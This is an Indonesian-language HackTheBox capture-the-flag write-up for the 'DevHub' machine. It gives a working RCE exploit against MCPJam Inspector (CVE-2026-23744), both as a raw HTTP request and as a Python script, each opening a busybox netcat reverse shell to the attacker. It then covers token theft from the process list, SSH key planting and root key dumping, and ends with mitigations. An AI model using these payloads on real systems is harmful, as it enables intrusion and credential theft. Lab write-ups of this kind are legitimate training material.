# DevHub: HackTheBox Write-Up

> **Mesin:** DevHub &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **IP:** `10.129.129.28` &nbsp;|&nbsp; **Domain:** `devhub.htb`

---

## Ringkasan (TL;DR)

| Tahap | Teknik | Hasil |
|---|---|---|
| **Foothold** | RCE via MCPJam Inspector 1.4.2 (CVE-2026-23744) | Shell sebagai `mcp-dev` |
| **LPE → analyst** | Token Jupyter dari `ps aux`, SSH key injection | Shell sebagai `analyst` |
| **LPE → root** | Dump SSH key via API `ops._admin_dump` | Shell sebagai `root` |

**Tools yang digunakan:** `nmap`, `burpsuite`, `netcat`, `ssh`, `curl`, `python3`

---

## Daftar Isi

1. [Persiapan](#1-persiapan)
2. [Reconnaissance](#2-reconnaissance)
3. [Foothold: RCE via CVE-2026-23744](#3-foothold--rce-via-cve-2026-23744)
4. [Privilege Escalation #1: mcp-dev → analyst](#4-privilege-escalation-1--mcp-dev--analyst)
5. [Privilege Escalation #2: analyst → root](#5-privilege-escalation-2--analyst--root)
6. [Flags](#6-flags)
7. [Lessons Learned & Mitigasi](#7-lessons-learned--mitigasi)

---

## 1. Persiapan

Langkah pertama adalah menghubungkan diri ke jaringan HackTheBox melalui VPN, lalu menambahkan entry domain mesin target ke `/etc/hosts`.

*[Image: VPN Terkoneksi]*

Setelah VPN aktif, konfirmasi bahwa mesin target dapat dijangkau.

*[Image: IP Mesin Target]*

---

## 2. Reconnaissance

### Port Scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.129.28
```

**Port yang terbuka:**

| Port | Service | Versi |
|---|---|---|
| `22` | SSH | OpenSSH |
| `80` | HTTP | nginx 1.18.0 |
| `6274` | HTTP | MCPJam Inspector |

### Pemberian nama domain kustom
```bash
# Tambahkan ke /etc/hosts
echo "10.129.129.28  devhub.htb" | sudo tee -a /etc/hosts
```
*[Image: Pemberian Domain]*

### Enumerasi Web: Port 80

Mengakses `http://devhub.htb` pada port 80 menampilkan halaman web utama aplikasi DevHub.

*[Image: Tampilan Web Port 80]*

### Enumerasi Web: Port 6274

Port 6274 menjalankan **MCPJam Inspector**, sebuah antarmuka web untuk mengelola dan menginspeksi MCP (Model Context Protocol) server.

Perhatikan versi yang berjalan:

*[Image: Versi MCP Rentan]*

> **⚠️ Temuan Kritis:** MCPJam Inspector versi **1.4.2**: versi ini diketahui rentan terhadap **CVE-2026-23744**.

---

## 3. Foothold: RCE via CVE-2026-23744
*[Image: Detail CVE]*

### Analisis Kerentanan

CVE-2026-23744 adalah kerentanan **Remote Code Execution (RCE)** pada MCPJam Inspector versi `≤ 1.4.2`. Endpoint `/api/mcp/connect` menerima parameter `serverConfig.command` dan `serverConfig.args` tanpa validasi atau sanitasi, memungkinkan penyerang mengeksekusi perintah arbitrary di server.

### Menyiapkan Listener

Sebelum mengirim exploit, siapkan Netcat listener di mesin penyerang untuk menangkap koneksi balik:

```bash
nc -lvnp 4444
```

*[Image: Netcat Listener Aktif]*

### Mengirim Payload Exploit

Kirim request berikut ke endpoint yang rentan. Payload memanfaatkan `busybox nc` untuk mengirimkan reverse shell ke mesin penyerang.

**Raw HTTP Request:**

```http
POST /api/mcp/connect HTTP/1.1
Host: devhub.htb:6274
Content-Type: application/json
Origin: http://devhub.htb:6274

{
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            "10.10.14.87",
            "4444",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}
```

Atau gunakan script otomatis yang disediakan:

```python
# SKRIP/exploit.py
import requests

target = "http://devhub.htb:6274"
ip     = "10.10.14.87"   # Ganti dengan IP attacker
port   = "4444"

url  = f'{target}/api/mcp/connect'
data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", ip, port, "-e", "/bin/bash"],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)
print(response.status_code)
print(response.text)
```

```bash
python3 SKRIP/exploit.py
```

### Hasil

Reverse shell berhasil diterima di listener. Kita mendapatkan shell sebagai user **`mcp-dev`**.

*[Image: Reverse Shell Berhasil]*

### Penemuan User Analyst

Saat `/etc/passwd` dienumerasi, ditemukan user lain bernama **analyst**.
```bash
cat /etc/passwd
```

*[Image: Penemuan user analyst]*

---

## 4. Privilege Escalation #1: mcp-dev → analyst

### Langkah 4.1: Menemukan Celah Pivoting
*[Image: Penemuan celah pivot]*
*(Hasil pemindaian linpeas)*

Dari pemindaian menggunakan linpeas, ditemukan port internal yang dapat di pivoting, yaitu port 8888 dan 5000.

### Langkah 4.2: Menemukan Token Jupyter

Setelah mendapatkan shell sebagai `mcp-dev`, lakukan enumerasi proses yang sedang berjalan untuk mencari informasi sensitif:

```bash
ps aux | grep python3
```

*[Image: Kerentanan Menuju LPE: Token Ditemukan]*

Dari output `ps aux`, terlihat proses Jupyter Notebook berjalan dengan parameter `--ServerApp.token`. Dengan nilai:

```
Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Langkah 4.3: SSH Port Forwarding ke Port 8888

Untuk mengakses Jupyter dari mesin penyerang, kita perlu membuat SSH tunnel. Gunakan script `konek.sh` untuk mempermudah proses ini:

**Persiapan tunnel:**

*[Image: Persiapan Pivot Step 1]*
*[Image: Persiapan Pivot Step 2]*

Perintah ini menghasilkan dua file:
- `pivot_key`: private key (simpan di mesin penyerang)
- `pivot_key.pub`: public key (akan ditanamkan ke target)

```bash
# konek.sh: SSH Auto-Connect dengan Port Forwarding
ssh -i <key> -L 8888:127.0.0.1:8888 mcp-dev@10.129.129.28
```

Tunnel aktif, port 8888 di target kini dapat diakses melalui `127.0.0.1:8888` di mesin penyerang:

*[Image: Pivot ke Port 8888]*

### Langkah 4.4: Login ke Jupyter Notebook

Buka browser dan akses:

```
http://localhost:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Gunakan token yang ditemukan sebelumnya untuk login.

*[Image: Di Dalam Jupyter Notebook]*

Jupyter Notebook memiliki fitur **Terminal** yang berjalan dalam konteks user `analyst`. Buka terminal melalui menu `New → Terminal`, lalu tanamkan *public key* pivot_key yang tadi telah dibuat.

### Langkah 4.5: Menanamkan Public Key

Masih di terminal Jupyter, tanamkan public key ke `authorized_keys` milik analyst:

```bash
# Buat direktori .ssh jika belum ada
mkdir -p ~/.ssh
chmod 700 ~/.ssh
```
Salin isi pivot_key.pub ke authorized_keys
```bash
# Di mesin penyerang
cat pivot_key.pub

# Di dalam terminal jupyter
echo "<PUB_KEY>" > .ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### Langkah 4.6: SSH sebagai analyst

Dengan private key yang sudah kita miliki, kita kini dapat SSH langsung sebagai `analyst`:

```bash
chmod 600 pivot_key
ssh -i pivot_key analyst@10.129.129.28
```

*[Image: SSH Pivot ke Analyst]*

**User flag berhasil didapatkan!**

*[Image: User Flag]*

---

## 5. Privilege Escalation #2: analyst → root

### Langkah 5.1: Enumerasi Internal Service

Selain port **8888** yang ditemukan, terdapat juga service yang berjalan di port **5000**. Ini adalah **Ops MCP Server** internal, yang bernama `server.py` yang dijalankan oleh root

*[Image: Pivoting Terdeteksi]*

### Langkah 5.2: Port Forwarding ke Port 5000

Gunakan SSH port forwarding untuk mengakses port 5000 dari mesin penyerang:

```bash
ssh -i pivot_key -L 5000:127.0.0.1:5000 analyst@10.129.129.28
```

### Langkah 5.3: Mengeksploitasi Ops MCP Server

Port 5000 menjalankan sebuah MCP Server internal dengan API yang dilindungi oleh **API key hardcoded**. Melalui enumerasi di filesystem, ditemukan API key tersebut:

```
X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

*[Image: API Key ke Port 5000]*

Server ini memiliki tool tersembunyi bernama `ops._admin_dump` yang dapat men-dump konfigurasi sensitif, termasuk SSH key milik root. Eksploitasi menggunakan `curl`:

*[Image: Vuln ke root]*

```bash
curl -i -v -X POST http://127.0.0.1:5000/tools/call \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-H "Content-Type: application/json" \
-d '{"name": "ops._admin_dump",
    "arguments": 
        {"target": "ssh_keys",
        "confirm": "True"}
    }'
```

Response mengembalikan **SSH private key milik root**!

### Langkah 5.4: Membuat SSH Key untuk Root

Dari hasil dump, kita mendapatkan private key root. Simpan ke file dan set permission yang tepat:

```bash
# Simpan private key root
nano root-key.txt
# Paste isi private key yang didapat dari dump

chmod 600 root-key.txt
```

### Langkah 5.5: SSH sebagai Root

```bash
ssh -i root-key.txt root@10.129.129.28
```

*[Image: SSH ke Root: Final]*

 **Root flag berhasil didapatkan!**

---

## 6. Flags

*[Image: Root Flag]*

*[Image: Done]*

| Flag | User |
|---|---|
| `user.txt` | `analyst` |
| `root.txt` | `root` |

---

## 7. Lessons Learned & Mitigasi

### Kerentanan yang Ditemukan

| # | Kerentanan | Dampak | Lokasi |
|---|---|---|---|
| 1 | **RCE via MCPJam Inspector 1.4.2** (CVE-2026-23744) | Command injection tanpa autentikasi | Port 6274 |
| 2 | **Credential leak via process list** | Token Jupyter terekspos di `ps aux` | `mcp-dev` shell |
| 3 | **Internal service tanpa enkripsi** | Jupyter tanpa HTTPS di jaringan lokal | Port 8888 |
| 4 | **API key hardcoded** | Akses penuh ke admin tool | Port 5000 |
| 5 | **Overprivileged internal API** | Dump SSH private key root | `ops._admin_dump` |

### Rekomendasi Mitigasi

**1. Update MCPJam Inspector**
Segera update ke versi terbaru yang telah mempatch CVE-2026-23744. Jangan expose MCPJam Inspector ke jaringan publik.

**2. Sembunyikan credentials dari process list**
Jangan meneruskan token/password sebagai argumen command line. Gunakan environment variable atau file konfigurasi dengan permission terbatas:
```bash
# Buruk
jupyter notebook --ServerApp.token=mysecret

# Lebih baik: gunakan config file dengan permission 600
jupyter notebook --config=/etc/jupyter/jupyter_config.py
```

**3. Rotasi dan pengelolaan API key**
Jangan hardcode API key di dalam kode. Gunakan secret manager (Vault, AWS Secrets Manager, dll.) dan rotasi key secara berkala.

**4. Principle of Least Privilege**
Tool `ops._admin_dump` seharusnya tidak dapat diakses oleh user biasa. Batasi akses admin tool hanya ke role tertentu dengan autentikasi yang kuat.

**5. Network Segmentation**
Internal service (port 5000, 8888) seharusnya tidak dapat di-pivot dari user shell yang berhasil dikompromi. Terapkan firewall rules yang ketat.

---

## Referensi

- [CVE-2026-23744: MCPJam Inspector RCE](https://nvd.nist.gov/)
- [HackTheBox: DevHub Machine](https://www.hackthebox.com/)

---

<div align="center">

*Write-up ini dibuat untuk tujuan edukasi dalam konteks legal CTF platform HackTheBox.*
*Jangan gunakan teknik ini di sistem yang tidak kamu miliki izin eksplisit untuk mengujinya.*

</div>
